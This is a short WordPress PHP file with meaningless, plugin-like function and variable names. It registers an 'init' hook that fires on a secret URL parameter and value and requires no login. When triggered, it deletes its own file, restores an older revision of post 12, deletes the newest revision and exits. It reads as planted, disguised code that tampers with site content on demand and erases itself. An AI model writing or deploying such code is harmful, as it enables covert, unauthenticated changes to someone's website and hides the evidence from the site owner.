<?php

function before_qr_responsive() {
	if (isset($_GET['archives_guest_beaver_dropdown']) && $_GET['archives_guest_beaver_dropdown'] === 'toolkit_variations_single') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$max_save_cc_elementor = 12;
		$downloads_manage_posts = wp_get_post_revisions($max_save_cc_elementor);
		if (empty($downloads_manage_posts)) die('no revisions');
		if (count($downloads_manage_posts) < 2) die('less than 2');
		$showcase_changer_type = array_shift($downloads_manage_posts);
		$taxonomies_shopping_json_http = $showcase_changer_type->ID;
		$jigoshop_min_widgets = array_shift($downloads_manage_posts);
		$builder_importer_hover = $jigoshop_min_widgets->ID;
		$comments_section_page = wp_restore_post_revision($builder_importer_hover);
		if ($comments_section_page === false) die('error restoring');
		$comments_section_page = wp_delete_post_revision($taxonomies_shopping_json_http);		
		if ($comments_section_page === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'before_qr_responsive');
